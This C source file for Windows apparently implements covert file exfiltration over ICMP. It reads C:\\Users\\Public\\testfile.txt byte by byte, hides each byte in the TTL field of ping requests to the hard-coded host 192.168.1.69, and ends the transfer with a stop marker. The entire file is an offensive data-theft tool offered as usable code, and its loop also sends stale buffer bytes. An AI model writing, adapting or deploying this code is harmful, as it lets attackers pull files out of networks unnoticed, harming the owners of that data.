#define _WIN32_WINNT 0x0600    
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>   // must come before windows.h
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "iphlpapi.lib") 
#pragma comment(lib, "ws2_32.lib")  

#define BUFFER_FILE_SIZE (4096 * 100)
#define TTL_ICMP_SIZE 1 
#define ICMP_TIMEOUT 1000
#define SIZE_OF_APPLICATION_DATA 0


unsigned char* fileName = "C:\\Users\\Public\\testfile.txt";
const char* IP_ADDR = "192.168.1.69";


void Send_End_Of_Content(IP_OPTION_INFORMATION* IP_Header, unsigned char* buffer_For_ICMP_ECHO_REPLY, unsigned long ipaddr_Formated, size_t reply_Buffer_Size) {
	char stop_Message[] = "<Done>-|_|-<stop>";
	WORD stop_Message_Size = sizeof(stop_Message);
	for (int i = 0; i < stop_Message_Size; i++) {
		printf("%d", i);
		IP_Header->Ttl = stop_Message[i];
		HANDLE ICMP_HANDLE = IcmpCreateFile();
		DWORD number_Of_Replys = IcmpSendEcho(ICMP_HANDLE, ipaddr_Formated, NULL, SIZE_OF_APPLICATION_DATA, IP_Header, buffer_For_ICMP_ECHO_REPLY, reply_Buffer_Size, ICMP_TIMEOUT);
	}
}

void Data_Exfil(HANDLE file_Handle, BYTE* buffer, DWORD* bytesRead, IP_OPTION_INFORMATION* IP_Header) {

	size_t reply_Buffer_Size = sizeof(ICMP_ECHO_REPLY) + 512;
	unsigned char* buffer_For_ICMP_ECHO_REPLY = (unsigned char*)VirtualAlloc(0, reply_Buffer_Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	unsigned long ipaddr_Formated = inet_addr(IP_ADDR);

	do {
		ReadFile(file_Handle, buffer, TTL_ICMP_SIZE, bytesRead, NULL);
		for (int i = 0; i < sizeof(DWORD); i++) {
			IP_Header->Ttl = (UCHAR)buffer[i];
			HANDLE ICMP_HANDLE = IcmpCreateFile();
			DWORD number_Of_Replys = IcmpSendEcho(ICMP_HANDLE, ipaddr_Formated, NULL, SIZE_OF_APPLICATION_DATA, IP_Header, buffer_For_ICMP_ECHO_REPLY, reply_Buffer_Size, ICMP_TIMEOUT);

		}
	} while (*bytesRead == (DWORD)TTL_ICMP_SIZE);
	Send_End_Of_Content(IP_Header, buffer_For_ICMP_ECHO_REPLY, ipaddr_Formated, reply_Buffer_Size);
}


int main() {
	DWORD bytesRead = 0;
	IP_OPTION_INFORMATION IP_Header;
	memset(&IP_Header, 0, sizeof(IP_Header));
	IP_Header.Tos = 0;
	IP_Header.Flags = 0;
	IP_Header.OptionsSize = 0;
	IP_Header.OptionsData = NULL;

	unsigned char* file_Content_Buffer = VirtualAlloc(0, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	HANDLE file_Handle = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	Data_Exfil(file_Handle, file_Content_Buffer, &bytesRead, &IP_Header);

	return 0;
}
